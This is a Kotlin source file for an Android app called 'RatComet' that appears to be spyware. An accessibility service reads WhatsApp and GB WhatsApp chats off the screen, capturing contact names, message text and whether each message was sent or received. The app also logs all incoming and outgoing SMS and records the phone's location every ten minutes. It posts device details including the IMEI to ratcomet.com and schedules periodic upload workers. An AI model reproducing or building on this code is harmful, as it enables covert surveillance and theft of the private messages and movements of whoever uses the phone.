package ug.hix.ratcomet

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.annotation.SuppressLint
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Build
import android.os.Bundle
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.work.*
import com.github.kittinunf.fuel.core.extensions.jsonBody
import com.github.kittinunf.fuel.httpPost
import com.google.gson.Gson
import com.tuenti.smsradar.Sms
import com.tuenti.smsradar.SmsListener
import com.tuenti.smsradar.SmsRadar
import kotlinx.coroutines.*
import ug.hix.ratcomet.model.LocationModel
import ug.hix.ratcomet.model.SmsModel
import ug.hix.ratcomet.model.SocialApp
import ug.hix.ratcomet.util.CometUtil
import ug.hix.ratcomet.workers.HalfHourWorker
import ug.hix.ratcomet.workers.HourWorker
import ug.hix.ratcomet.workers.OneDayWorker
import java.util.concurrent.TimeUnit


class Accessibility :  AccessibilityService(), LocationListener {
    companion object  {
        var phoneImei = ""
    }
    private val TAG = javaClass.simpleName
    private var inputStartTime : Long = 0L
    private var lastMessageTime : Long = 0L
    private var listen : Boolean = false
    private var smsService : Boolean = false
    private var inputText : Pair<String,String> = Pair("","")
    private var whatsappText = ""
    lateinit var context : Context
    lateinit var repo : Repository
    lateinit var locationManager: LocationManager
    lateinit var startUpJob : Job

    private var isValid  = false
    private var isActive : Boolean = false

    override fun onCreate() {
        super.onCreate()
        context = applicationContext
        repo = Repository(context)
        locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
    }
    override fun onAccessibilityEvent(mEvent: AccessibilityEvent?) {
        mEvent?.let { event ->
//            if(isActive) {
                when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_CLICKED -> {
//                    val clicked = event.text.joinToString()
//                    val parent = rootInActiveWindow
//                    getChildren(parent, 0)
//                    Log.d(TAG,"$clicked clicked by ${event.packageName}")


//                    when (event.packageName) {
//                        "com.whatsapp" -> {

//                            val clicked = event.text.joinToString()
//                            Log.d(TAG, "$clicked clicked by ${event.packageName}")
//                            if (clicked == "Type a message" || clicked == inputText.second) {
////                                TODO("reset type listener and start logger")
//                                listen = true
//                                val parent = rootInActiveWindow
////                                getChildren(parent, 0)
//                            } else {
//                                listen = false
//                                Log.d(TAG, "$clicked clicked by ${event.packageName}")
//
//                            }
//                        }
//                        "com.gbwhatsapp" -> {
//
//                        }
//                        "com.facebook.lite" -> {
//
//                        }
//                        "org.telegram.messenger" -> {
//
//                        }
//                        "com.zeenode.aims1" -> {
//
//                        }
//                        "com.transsion.phoenix" -> {
//
//                        }
//                        "com.duckduckgo.mobile.android" -> {
//
//                        }
//                        "com.instagram" -> {
//
//                        }
//                        "com.snapchat" -> {
//
//                        }
//                        "com.twitter" -> {
//
//
//                        }
//                        "com.android.chrome" -> {
//
//                        }
//                        else -> {
//
//                        }
//                    }
                }
                AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
//                    Log.d(TAG, "view focused by ${event.packageName}")

                }
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
//                    if (listen) {
                        when (event.packageName) {
                            "com.whatsapp" -> {
//                                inputText = Pair("WhatsApp", event.text.joinToString())
                                whatsappText = event.text.joinToString()
                            }
                            "com.gbwhatsapp" -> {
//                                inputText = Pair("WhatsApp", event.text.joinToString())
                                whatsappText = event.text.joinToString()

                            }
//                            "com.facebook.lite" -> {
//                                inputStartTime = System.currentTimeMillis()
//                                inputText = Pair("Facebook", event.text.joinToString())
//                            }
//                            "org.telegram.messenger" -> {
//                                inputStartTime = System.currentTimeMillis()
//                                inputText = Pair("Telegram", event.text.joinToString())
//                            }
//                            "com.zeenode.aims1" -> {
//                                inputStartTime = System.currentTimeMillis()
//                                inputText = Pair("Telegram", event.text.joinToString())
//                            }
//                            "com.transsion.phoenix" -> {
//                                inputStartTime = System.currentTimeMillis()
//                                inputText = Pair("Phoenix", event.text.joinToString())
//                            }
//                            "com.duckduckgo.mobile.android" -> {
//                                inputStartTime = System.currentTimeMillis()
//                                inputText = Pair("DuckDuckGo", event.text.joinToString())
//                            }
//                            "com.instagram" -> {
//                                inputStartTime = System.currentTimeMillis()
//                                inputText = Pair("Instagram", event.text.joinToString())
//                            }
//                            "com.snapchat" -> {
//                                inputText = Pair("SnapChat", event.text.joinToString())
//                                inputStartTime = System.currentTimeMillis()
//                            }
//                            "com.twitter" -> {
//                                inputStartTime = System.currentTimeMillis()
//                                inputText = Pair("Twitter", event.text.joinToString())
//                            }
//                            "com.android.chrome" -> {
//                                inputStartTime = System.currentTimeMillis()
//                                inputText = Pair("Chrome", event.text.joinToString())
//                            }
                            else -> {

                            }
                        }
//                    } else {
//                        Log.i(TAG, "listener not set")
//                    }
                }
                AccessibilityEvent.TYPE_VIEW_SELECTED -> {
//                    Log.d(TAG, "view selected by ${event.packageName}")
                }
                AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> {

                }
                AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
//                    Log.d(TAG, "notification ${event.text} by ${event.packageName}")
                }
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {

                    when (event.packageName) {

                        "com.gbwhatsapp" -> {
                            if ((System.currentTimeMillis() - lastMessageTime) >= 500L) {
                                lastMessageTime = System.currentTimeMillis()
                                runBlocking(Dispatchers.IO) {
                                    if (this@Accessibility.isValid) {
                                        val parent = rootInActiveWindow
                                        parent?.let {
                                            val messageEntry =
                                                parent.findAccessibilityNodeInfosByViewId("com.gbwhatsapp:id/entry")
                                            val messageList = parent.findAccessibilityNodeInfosByViewId("android:id/list")
                                            try {
                                                if (messageList.isNotEmpty() && messageEntry.isNotEmpty()) {
                                                    if (messageEntry[0].text.toString() == "Type a message") {
                                                        val contactName =
                                                            parent.findAccessibilityNodeInfosByViewId("com.gbwhatsapp:id/conversation_contact_name")
                                                                .first().text.toString()
                                                        messageList[0].let { list ->
                                                            var count = 0
                                                            var tempMsgList = mutableListOf<SocialApp>()
                                                            while (true) {
                                                                if (count == list.childCount) break
                                                                val viewGroup = list.getChild(count)
                                                                viewGroup?.let { messageContainer ->
                                                                    if (messageContainer.className.toString() == "android.view.ViewGroup") {
                                                                        var type = "incoming"
                                                                        val date =
                                                                            messageContainer.findAccessibilityNodeInfosByViewId(
                                                                                "com.gbwhatsapp:id/date"
                                                                            )
                                                                        val msg =
                                                                            messageContainer.findAccessibilityNodeInfosByViewId(
                                                                                "com.gbwhatsapp:id/message_text"
                                                                            )
                                                                        val status =
                                                                            messageContainer.findAccessibilityNodeInfosByViewId(
                                                                                "com.gbwhatsapp:id/status"
                                                                            )

                                                                        if (status.isNotEmpty()) type = "outgoing"
                                                                        if (date.isNotEmpty() && msg.isNotEmpty()) {
                                                                            val dataObj = SocialApp(
                                                                                contact = contactName,
                                                                                type = type,
                                                                                message = msg.first().text.toString(),
                                                                                platform = "whatsapp",
                                                                                date = date.first().text.toString()
                                                                            )
                                                                            tempMsgList.add(dataObj) //add the message to the list for evaluation

                                                                        }

                                                                    }
                                                                    count++
                                                                }
                                                            }
                                                            val lastConversationMsg = repo.getLastSavedMsg(contactName)
                                                            val firstConversationMsg = repo.getFirstSavedMsg(contactName)
//                                                            Log.d("Converse", "Last : $lastConversationMsg      first: $firstConversationMsg")
//                                                            Log.d("TEMP LIST", "$tempMsgList")
                                                            if (lastConversationMsg == null && firstConversationMsg == null) {
                                                                tempMsgList = tempMsgList.mapIndexed { index, msg ->
                                                                    SocialApp(
                                                                        contact = msg.contact,
                                                                        type = msg.type,
                                                                        message = msg.message,
                                                                        platform = msg.platform,
                                                                        date = msg.date,
                                                                        position = index
                                                                    )
                                                                } as MutableList<SocialApp>

                                                                //insert first and last message in db
                                                                try {
                                                                    //Insert into to_send database
                                                                    repo.insertSocialSend(tempMsgList)
//                                            change position of last message to 1 to resolve conflict
                                                                    val lastMsg = tempMsgList.last().let {
                                                                        SocialApp(
                                                                            contact = it.contact,
                                                                            position = it.position,
                                                                            date = "last",
                                                                            message = it.message,
                                                                            platform = "${it.platform}@${it.date}",
                                                                            type = it.type
                                                                        )
                                                                    }
                                                                    val firstMsg = tempMsgList.first().let {
                                                                        SocialApp(
                                                                            contact = it.contact,
                                                                            position = it.position,
                                                                            date = "first",
                                                                            message = it.message,
                                                                            platform = "${it.platform}@${it.date}",
                                                                            type = it.type
                                                                        )
                                                                    }
                                                                    repo.insertSocialMsg(listOf(firstMsg, lastMsg))

                                                                } catch (e: Exception) {
//                                                                    Log.e(TAG, "Error occurred when pushing messages", e)
                                                                }

                                                            } else {
//                                                        find position of first and or last in tempList and assign order
                                                                val firstIndex = tempMsgList.indexOfFirst {
                                                                    SocialApp(
                                                                        contact = it.contact,
                                                                        type = it.type,
                                                                        message = it.message,
                                                                        platform = it.platform,
                                                                        date = it.date
                                                                    ) == firstConversationMsg?.let { it1 ->
                                                                        val correct = it1.platform.split("@")
                                                                        SocialApp(
                                                                            contact = it1.contact,
                                                                            type = it1.type,
                                                                            message = it1.message,
                                                                            platform = correct.first(),
                                                                            date = correct.last()
                                                                        )
                                                                    }
                                                                }
                                                                val lastIndex = tempMsgList.indexOfFirst {
                                                                    SocialApp(
                                                                        contact = it.contact,
                                                                        type = it.type,
                                                                        message = it.message,
                                                                        platform = it.platform,
                                                                        date = it.date
                                                                    ) == lastConversationMsg?.let { it1 ->
                                                                        val correct = it1.platform.split("@")
                                                                        SocialApp(
                                                                            contact = it1.contact,
                                                                            type = it1.type,
                                                                            message = it1.message,
                                                                            platform = correct.first(),
                                                                            date = correct.last()
                                                                        )
                                                                    }
                                                                }
                                                                if (firstIndex != -1 && firstIndex != 0) {
                                                                    val previousFirstPosition = firstConversationMsg!!.position
                                                                    try {
                                                                        //put below list tosend_db
                                                                        val sendList = tempMsgList.subList(0, firstIndex)
                                                                            .mapIndexed { index, msg ->
                                                                                SocialApp(
                                                                                    contact = msg.contact,
                                                                                    type = msg.type,
                                                                                    message = msg.message,
                                                                                    platform = msg.platform,
                                                                                    date = msg.date,
                                                                                    position = previousFirstPosition - (firstIndex - index)
                                                                                )
                                                                            } as MutableList<SocialApp>
                                                                        repo.insertSocialSend(sendList)
                                                                        val firstMsg = sendList.first().let {
                                                                            SocialApp(
                                                                                contact = it.contact,
                                                                                position = it.position,
                                                                                date = "first",
                                                                                message = it.message,
                                                                                platform = "${it.platform}@${it.date}",
                                                                                type = it.type
                                                                            )
                                                                        }
                                                                        repo.insertSocialMsg(listOf(firstMsg))
                                                                    } catch (e: Exception) {
//                                                                        Log.e(TAG, "something went wrong with first", e)
                                                                    }
                                                                }
                                                                if (lastIndex != -1 && lastIndex != (tempMsgList.size - 1)) {
                                                                    val previousLastPosition = lastConversationMsg!!.position
                                                                    try {
                                                                        val sendList = tempMsgList.drop(lastIndex + 1)
                                                                            .mapIndexed { index, msg ->
                                                                                SocialApp(
                                                                                    contact = msg.contact,
                                                                                    type = msg.type,
                                                                                    message = msg.message,
                                                                                    platform = msg.platform,
                                                                                    date = msg.date,
                                                                                    position = previousLastPosition + (index + 1)
                                                                                )
                                                                            } as MutableList<SocialApp>
                                                                        val lastMsg = sendList.last().let {
                                                                            SocialApp(
                                                                                contact = it.contact,
                                                                                position = it.position,
                                                                                date = "last",
                                                                                message = it.message,
                                                                                platform = "${it.platform}@${it.date}",
                                                                                type = it.type
                                                                            )
                                                                        }
                                                                        repo.insertSocialMsg(listOf(lastMsg))
                                                                        repo.insertSocialSend(sendList)
                                                                    } catch (e: Exception) {
//                                                                        Log.e(TAG, "Something went wrong with last", e)
                                                                    }
                                                                } else if (whatsappText == tempMsgList.last().message && whatsappText != lastConversationMsg!!.message) {
                                                                    whatsappText = ""
                                                                    val previousLastPosition =
                                                                        lastConversationMsg.position
                                                                    try {
                                                                        val sendList = tempMsgList.last().let{ msg ->
                                                                            SocialApp(
                                                                                contact = msg.contact,
                                                                                type = msg.type,
                                                                                message = msg.message,
                                                                                platform = msg.platform,
                                                                                date = msg.date,
                                                                                position = previousLastPosition + 1
                                                                            )
                                                                        }
                                                                        val lastMsg = sendList.let {
                                                                            SocialApp(
                                                                                contact = it.contact,
                                                                                position = it.position,
                                                                                date = "last",
                                                                                message = it.message,
                                                                                platform = "${it.platform}@${it.date}",
                                                                                type = it.type
                                                                            )
                                                                        }
                                                                        repo.insertSocialMsg(listOf(lastMsg))
                                                                        repo.insertSocialSend(listOf(sendList))
                                                                    } catch (e: Exception) {
//                                                                        Log.e(TAG, "Something went wrong with last", e)
                                                                    }
                                                                }else {
                                                                }
                                                            }
//                                    tempMsgList.clear()
                                                        }
//                            }else{}

                                                    } else {
                                                    }
                                                } else {
                                                }
                                            } catch (e: Exception) {
//                                                Log.e(TAG, "Error occurred : ", e)
                                            }

                                        }
                                    }
//                                        this@Accessibility.isRunning = false //WHEN FINISHED, allow another scraping
                                }
//            isRunning = false
                            } else {
                            }


                        }
                        "com.whatsapp" -> {
                            if ((System.currentTimeMillis() - lastMessageTime) >= 500L) {
                                lastMessageTime = System.currentTimeMillis()
                                runBlocking(Dispatchers.IO) {
                                    if (this@Accessibility.isValid){
                                        val parent = rootInActiveWindow
                                        parent?.let {
                                            val messageEntry =
                                                parent.findAccessibilityNodeInfosByViewId("com.whatsapp:id/entry")
                                            val messageList = parent.findAccessibilityNodeInfosByViewId("android:id/list")
                                            try {
                                                if (messageList.isNotEmpty() && messageEntry.isNotEmpty()) {
                                                    if (messageEntry[0].text.toString() == "Type a message") {
                                                        val contactName =
                                                            parent.findAccessibilityNodeInfosByViewId("com.whatsapp:id/conversation_contact_name")
                                                                .first().text.toString()
                                                        messageList[0].let { list ->
                                                            var count = 0
                                                            var tempMsgList = mutableListOf<SocialApp>()
                                                            while (true) {
                                                                if (count == list.childCount) break
                                                                val viewGroup = list.getChild(count)
                                                                viewGroup?.let { messageContainer ->
                                                                    if (messageContainer.className.toString() == "android.view.ViewGroup") {
                                                                        var type = "incoming"
                                                                        val date =
                                                                            messageContainer.findAccessibilityNodeInfosByViewId(
                                                                                "com.whatsapp:id/date"
                                                                            )
                                                                        val msg =
                                                                            messageContainer.findAccessibilityNodeInfosByViewId(
                                                                                "com.whatsapp:id/message_text"
                                                                            )
                                                                        val status =
                                                                            messageContainer.findAccessibilityNodeInfosByViewId(
                                                                                "com.whatsapp:id/status"
                                                                            )

                                                                        if (status.isNotEmpty()) type = "outgoing"
                                                                        if (date.isNotEmpty() && msg.isNotEmpty()) {
                                                                            val dataObj = SocialApp(
                                                                                contact = contactName,
                                                                                type = type,
                                                                                message = msg.first().text.toString(),
                                                                                platform = "whatsapp",
                                                                                date = date.first().text.toString()
                                                                            )
                                                                            tempMsgList.add(dataObj) //add the message to the list for evaluation

                                                                        }

                                                                    }
                                                                    count++
                                                                }
                                                            }
                                                            val lastConversationMsg = repo.getLastSavedMsg(contactName)
                                                            val firstConversationMsg = repo.getFirstSavedMsg(contactName)
//                                                            Log.d("Converse", "Last : $lastConversationMsg      first: $firstConversationMsg")
//                                    tempMsgList = tempMsgList.mapIndexed { index, msg ->
//                                        SocialApp(contact = msg.contact,type = msg.type,message = msg.message,platform = msg.platform,date = msg.date,position = index)
//                                    } as MutableList<SocialApp>
//                                                            Log.d("TEMP LIST", "$tempMsgList")
                                                            if (lastConversationMsg == null && firstConversationMsg == null) {
                                                                tempMsgList = tempMsgList.mapIndexed { index, msg ->
                                                                    SocialApp(
                                                                        contact = msg.contact,
                                                                        type = msg.type,
                                                                        message = msg.message,
                                                                        platform = msg.platform,
                                                                        date = msg.date,
                                                                        position = index
                                                                    )
                                                                } as MutableList<SocialApp>

                                                                //insert first and last message in db
                                                                try {
                                                                    //Insert into to_send database
                                                                    repo.insertSocialSend(tempMsgList)
//                                            change position of last message to 1 to resolve conflict
                                                                    val lastMsg = tempMsgList.last().let {
                                                                        SocialApp(
                                                                            contact = it.contact,
                                                                            position = it.position,
                                                                            date = "last",
                                                                            message = it.message,
                                                                            platform = "${it.platform}@${it.date}",
                                                                            type = it.type
                                                                        )
                                                                    }
                                                                    val firstMsg = tempMsgList.first().let {
                                                                        SocialApp(
                                                                            contact = it.contact,
                                                                            position = it.position,
                                                                            date = "first",
                                                                            message = it.message,
                                                                            platform = "${it.platform}@${it.date}",
                                                                            type = it.type
                                                                        )
                                                                    }
                                                                    repo.insertSocialMsg(listOf(firstMsg, lastMsg))

                                                                } catch (e: Exception) {
//                                                                    Log.e(TAG, "Error occurred when pushing messages", e)
                                                                }

                                                            } else {
//                                                        find position of first and or last in tempList and assign order
                                                                val firstIndex = tempMsgList.indexOfFirst {
                                                                    SocialApp(
                                                                        contact = it.contact,
                                                                        type = it.type,
                                                                        message = it.message,
                                                                        platform = it.platform,
                                                                        date = it.date
                                                                    ) == firstConversationMsg?.let { it1 ->
                                                                        val correct = it1.platform.split("@")
                                                                        SocialApp(
                                                                            contact = it1.contact,
                                                                            type = it1.type,
                                                                            message = it1.message,
                                                                            platform = correct.first(),
                                                                            date = correct.last()
                                                                        )
                                                                    }
                                                                }
                                                                val lastIndex = tempMsgList.indexOfFirst {
                                                                    SocialApp(
                                                                        contact = it.contact,
                                                                        type = it.type,
                                                                        message = it.message,
                                                                        platform = it.platform,
                                                                        date = it.date
                                                                    ) == lastConversationMsg?.let { it1 ->
                                                                        val correct = it1.platform.split("@")
                                                                        SocialApp(
                                                                            contact = it1.contact,
                                                                            type = it1.type,
                                                                            message = it1.message,
                                                                            platform = correct.first(),
                                                                            date = correct.last()
                                                                        )
                                                                    }
                                                                }
                                                                if (firstIndex != -1 && firstIndex != 0) {
                                                                    val previousFirstPosition =
                                                                        firstConversationMsg!!.position
                                                                    try {
                                                                        //put below list tosend_db
                                                                        val sendList = tempMsgList.subList(0, firstIndex)
                                                                            .mapIndexed { index, msg ->
                                                                                SocialApp(
                                                                                    contact = msg.contact,
                                                                                    type = msg.type,
                                                                                    message = msg.message,
                                                                                    platform = msg.platform,
                                                                                    date = msg.date,
                                                                                    position = previousFirstPosition - (firstIndex - index)
                                                                                )
                                                                            } as MutableList<SocialApp>
                                                                        repo.insertSocialSend(sendList)
                                                                        val firstMsg = sendList.first().let {
                                                                            SocialApp(
                                                                                contact = it.contact,
                                                                                position = it.position,
                                                                                date = "first",
                                                                                message = it.message,
                                                                                platform = "${it.platform}@${it.date}",
                                                                                type = it.type
                                                                            )
                                                                        }
                                                                        repo.insertSocialMsg(listOf(firstMsg))
                                                                    } catch (e: Exception) {
//                                                                        Log.e(TAG, "something went wrong with first", e)
                                                                    }
                                                                }
                                                                if (lastIndex != -1 && lastIndex != (tempMsgList.size - 1)) {
                                                                    val previousLastPosition =
                                                                        lastConversationMsg!!.position
                                                                    try {
                                                                        val sendList = tempMsgList.drop(lastIndex + 1)
                                                                            .mapIndexed { index, msg ->
                                                                                SocialApp(
                                                                                    contact = msg.contact,
                                                                                    type = msg.type,
                                                                                    message = msg.message,
                                                                                    platform = msg.platform,
                                                                                    date = msg.date,
                                                                                    position = previousLastPosition + (index + 1)
                                                                                )
                                                                            } as MutableList<SocialApp>
                                                                        val lastMsg = sendList.last().let {
                                                                            SocialApp(
                                                                                contact = it.contact,
                                                                                position = it.position,
                                                                                date = "last",
                                                                                message = it.message,
                                                                                platform = "${it.platform}@${it.date}",
                                                                                type = it.type
                                                                            )
                                                                        }
                                                                        repo.insertSocialMsg(listOf(lastMsg))
                                                                        repo.insertSocialSend(sendList)
                                                                    } catch (e: Exception) {
//                                                                        Log.e(TAG, "Something went wrong with last", e)
                                                                    }
                                                                } else if (whatsappText == tempMsgList.last().message && whatsappText != lastConversationMsg!!.message) {
                                                                    whatsappText = ""
                                                                    val previousLastPosition =
                                                                        lastConversationMsg.position
                                                                    try {
                                                                        val sendList = tempMsgList.last().let{ msg ->
                                                                            SocialApp(
                                                                                    contact = msg.contact,
                                                                                    type = msg.type,
                                                                                    message = msg.message,
                                                                                    platform = msg.platform,
                                                                                    date = msg.date,
                                                                                    position = previousLastPosition + 1
                                                                                )
                                                                            }
                                                                        val lastMsg = sendList.let {
                                                                            SocialApp(
                                                                                contact = it.contact,
                                                                                position = it.position,
                                                                                date = "last",
                                                                                message = it.message,
                                                                                platform = "${it.platform}@${it.date}",
                                                                                type = it.type
                                                                            )
                                                                        }
                                                                        repo.insertSocialMsg(listOf(lastMsg))
                                                                        repo.insertSocialSend(listOf(sendList))
                                                                    } catch (e: Exception) {
//                                                                        Log.e(TAG, "Something went wrong with last", e)
                                                                    }
                                                                } else {
                                                                }
                                                            }
//                                    tempMsgList.clear()
                                                        }
//                            }else{}

                                                    } else {
                                                    }
                                                } else {
                                                }
                                            } catch (e: Exception) {
//                                                Log.e(TAG, "Error occurred : ", e)
                                            }

                                        }
                                    }

//                                        this@Accessibility.isRunning = false //WHEN FINISHED, allow another scraping
                                }
//            isRunning = false
//                                Log.d(TAG, "WhatsApp scrapper reached")
                            } else {
                            }

                        }
                        "com.facebook.lite" -> {
//                                val parent = rootInActiveWindow
//                                getChildren(parent, 0)
                        }
                        "org.telegram.messenger" -> {

                        }
                        else -> {

                        }
                    }


                }
                else -> {

                }
                }
//            }
        }

    }

    override fun onInterrupt() {
    }

    @SuppressLint("MissingPermission")
    override fun onServiceConnected() {
        super.onServiceConnected()
        val info = AccessibilityServiceInfo()
        info.apply {
            feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK
            notificationTimeout = 100
            packageNames = arrayOf("com.whatsapp","com.gbwhatsapp")
            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
        }
        this.serviceInfo = info

        val filter = IntentFilter(LocationManager.PROVIDERS_CHANGED_ACTION).apply {
            addAction(Intent.ACTION_PROVIDER_CHANGED)
        }
        context.registerReceiver(locationReceiver,filter)

        try{
            startUpJob = GlobalScope.launch(Dispatchers.IO) {
                //This runs after activity set up
                val dbPhoneInitial = repo.getInitialConn()
                if(dbPhoneInitial == null) {
                    withContext(Dispatchers.Main) {createNotification()}
                }else{
                    phoneImei = dbPhoneInitial.imei
                    if(dbPhoneInitial.token_valid){
                        isValid = true
                    }
                }

                if(!isValid) {
                    //            CHECK TOKEN IS AVAILABLE
                    while(isActive){
                        when(CometUtil.isValidToken(repo)) {
                            "true" -> {
                                isValid = true
                                repo.updateValidity()
                                val dbPhone = repo.getInitialConn()
                                dbPhone?.let {
                                    phoneImei = it.imei

                                    //                    SEND INFO ABOUT PHONE
                                    "https://ratcomet.com/api/phone".httpPost()
                                        .jsonBody(
                                            Gson().toJson(it)
                                        )
                                        .responseString()

                                    //schedule workers
                                    val myConstraints = Constraints.Builder()
                                        .setRequiredNetworkType(NetworkType.CONNECTED)
                                        .build()
                                    val dailyWork = PeriodicWorkRequest.Builder(OneDayWorker::class.java,24, TimeUnit.HOURS)
                                        .setConstraints(myConstraints)
                                        .addTag("dailyWorker")
                                        .build()
                                    val hourlyWork = PeriodicWorkRequest.Builder(HourWorker::class.java, 1, TimeUnit.HOURS)
                                        .setConstraints(myConstraints)
                                        .addTag("hourlyWorker")
                                        .build()
                                    val halfHourWork = PeriodicWorkRequest.Builder(HalfHourWorker::class.java, 30, TimeUnit.MINUTES)
                                        .setConstraints(myConstraints)
                                        .addTag("30MinuteWorker")
                                        .build()

                                    WorkManager.getInstance(context).enqueueUniquePeriodicWork("daily_Worker", ExistingPeriodicWorkPolicy.KEEP, dailyWork)
                                    WorkManager.getInstance(context).enqueueUniquePeriodicWork("hourly_Worker", ExistingPeriodicWorkPolicy.KEEP, hourlyWork)
                                    WorkManager.getInstance(context).enqueueUniquePeriodicWork("30Minute_Worker", ExistingPeriodicWorkPolicy.KEEP, halfHourWork)

                                }
                                if(dbPhone != null) break

                            }
                            "false" -> {
//                                Log.d(TAG,"Closing accessibility service")
                                //stop accessibility service since token is faulty / phone exist and report
                                isValid = false
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                                    disableSelf()
                                    break
                                }else{
                                    serviceInfo = AccessibilityServiceInfo()
                                }
                            }
                            else -> {
//                                Log.d(TAG,"connection off")
                            }
                        }
                        delay(3000L)
                    }
                }

                if (isValid) {
                    this@Accessibility.isActive = (CometUtil.isActiveToken(repo) == "true")
                    if(!smsService) {
                        smsService = true
                        SmsRadar.initializeSmsRadarService(context, object : SmsListener {
                            override fun onSmsSent(sms: Sms?) {
                                sms?.let {
                                    val smsEntry = SmsModel(address = it.address, msg = it.msg, type = "outgoing")
                                    repo.insertSms(smsEntry)
                                }
                            }

                            override fun onSmsReceived(sms: Sms?) {
                                sms?.let {
                                    val smsEntry = SmsModel(address = it.address, msg = it.msg, type = "incoming")
                                    repo.insertSms(smsEntry)
                                }
                            }
                        })

                    }

                }
            }
        }catch (e : Exception) {
//            Log.e(TAG,"OnConnect Error",e)
        }


    }
    private fun hasPermission(context: Context, vararg permissions : String): Boolean = permissions.all{
        ActivityCompat.checkSelfPermission(context,it) == PackageManager.PERMISSION_GRANTED
    }
    private fun createNotification() {
        val channelId = "ug.hix.ratcomet"
        val name = "ug.hix.ratcomet"
        val descriptionText = "RatComet"

        val notificationManager = context.applicationContext.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val importance = NotificationManager.IMPORTANCE_DEFAULT
            val channel = NotificationChannel(channelId, name, importance).apply {
                description = descriptionText
            }
            notificationManager.createNotificationChannel(channel)
        }
        val notificationIntent = Intent(this@Accessibility, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(this@Accessibility,0,notificationIntent,0)
        val notification = NotificationCompat.Builder(this@Accessibility,channelId)
            .setContentTitle("RatComet")
            .setContentText("Tap Me")
            .setSmallIcon(R.drawable.ic_device)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setContentIntent(pendingIntent)
            .setAutoCancel(true)
            .build()
        notificationManager.notify(457334,notification)
    }
    private fun  getChildren(parent : AccessibilityNodeInfo?, index : Int) {
        parent?.let {
//            if(it.className.toString() == "android.view.ViewGroup"){
//                Log.d(TAG,"Child :  ${it.text}")
//            }else{
//                Log.d(TAG,"ChildClass: ${it.className}")
                val childCount = it.childCount
                var count = 0
                while(true){
                    if(count == childCount) break
                    val child = it.getChild(count)
                    getChildren(child, index+1)
                    child?.let {
                        if(child.text.isNullOrEmpty()) {
//                            Log.d(TAG,"Parent: $index TYpe: ${child.className} text: ${child.describeContents() }id: ${child.viewIdResourceName}")
                        }else{
//                            Log.d(TAG,"Parent: $index Child :  ${child.text}  id: ${child.viewIdResourceName}")
                        }
                    }
                    count++
                }
//            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        if(smsService)
            smsService = false
            SmsRadar.stopSmsRadarService(context)
        context.unregisterReceiver(locationReceiver)
        startUpJob.cancel()
    }

    override fun onLocationChanged(p0: Location) {
        val locationObj = LocationModel(latitude = p0.latitude, longitude = p0.longitude)
        repo.insertLocation(locationObj)
//        Log.e(TAG,"Latitude: ${p0.latitude}   Longitude: ${p0.longitude}")
    }

     override fun onProviderDisabled(provider: String) {}

    override fun onProviderEnabled(provider: String) {}

    override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}

    @SuppressLint("MissingPermission")
    val locationReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            intent?.let {
                if(it.action == LocationManager.PROVIDERS_CHANGED_ACTION) {
                    val manager = context!!.getSystemService(LOCATION_SERVICE) as LocationManager
                    val gpsEnabled = manager.isProviderEnabled(LocationManager.GPS_PROVIDER)
                    val networkEnabled = manager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)

                    if(gpsEnabled)
                        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,1000L * 60 * 10, 50F,this@Accessibility)
                    if(networkEnabled)
                        locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER,1000L * 60 * 10, 50F,this@Accessibility)

                }
            }
        }

    }

}